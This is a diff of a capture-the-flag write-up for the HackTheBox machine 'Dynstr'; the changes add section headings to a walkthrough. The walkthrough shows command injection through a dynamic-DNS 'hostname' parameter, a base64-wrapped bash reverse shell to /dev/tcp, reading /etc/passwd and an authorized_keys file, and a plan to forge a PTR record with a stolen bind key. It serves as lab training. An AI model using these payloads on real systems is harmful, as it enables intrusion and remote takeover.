@@ -139,6 +139,8 @@ Before we proceed, let us add these dns names as an entry for 10.10.10.244 in ou
 
 When we browse to the site using these domain names, there is nothing noteworthy. Let us proceed. 
 
+#### Interacting with hidden endpoints
+
 Using a directory buster like gobuster or feroxbuster, we search for any directories and come across `/nic/` and a file called `update` within this directory.
 
 ```
@@ -201,6 +203,8 @@ Let us try specifying a custom subdomain name.
 
 As we can see, when I specify a subdomain (in my case `ch3s.dnsalias.htb`), we recieve a response `good`, indicating that the update was successful and that the IP address was changed in the system. 
 
+#### Achieving Command Execution
+
 > From here, I proceeded to play around with the request, seeing if I could inject a command with in the `hostname` or `myip` parameters. When I sent the following payload in the hostname parameter, the response I got was quite interesting:
 
 `hostname=id;ch3s.dnsalias.htb`
@@ -227,7 +231,11 @@ By this point, the assumption is that the command `id` is being used as the inpu
 
 ![/img/dynstr/cmd-exec.png](/img/dynstr/cmd-exec.png)
 
-We have now achieved command execution. Let us use this to get a reverse shell. We will take the following payload and base64 encode it.
+We have now achieved command execution. 
+
+### Getting shell as www-data
+
+Let us use this to get a reverse shell. We will take the following payload and base64 encode it.
 
 `echo "/bin/bash -c 'bash -i >& /dev/tcp/<ip>/<port> 0>&1'" | base64`
 
@@ -264,6 +272,8 @@ Let's upgrade our python shell using
 
 ## Escalation to User
 
+### Enumeration as www-data
+
 Looking into /etc/passwd, we find two users:
 
 ```
@@ -294,6 +304,8 @@ Looking into the authorized_keys file in bindmgr, we can see that only hosts wit
 $ cat authorized_keys
 from="*.infra.dyna.htb" ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDF4pkc7L5EaGz6CcwSCx1BqzuSUBvfseFUA0mBjsSh7BPCZIJyyXXjaS69SHEu6W2UxEKPWmdlj/WwmpPLA8ZqVHtVej7aXQPDHfPHuRAWI95AnCI4zy7+DyVXceMacK/MjhSiMAuMIfdg9W6+6EXTIg+8kN6yx2i38PZU8mpL5MP/g2iDKcV5SukhbkNI/4UvqheKX6w4znOJElCX+AoJZYO1QcdjBywmlei0fGvk+JtTwSBooPr+F5lewPcafVXKw1l2dQ4vONqlsN1EcpEkN+28ndlclgvm+26mhm7NNMPVWs4yeDXdDlP3SSd1ynKEJDnQhbhc1tcJSPEn7WOD bindmgr@nomen
 ```
+
+#### Shell as bindmgr
 
 We can associate our IP to a domain name by adding a PTR recod with the domain name scheme in the authorized_key file. In order to do that, we must first get the bind key for the `infra` subdomain, which can be found in `/etc/bind`
 
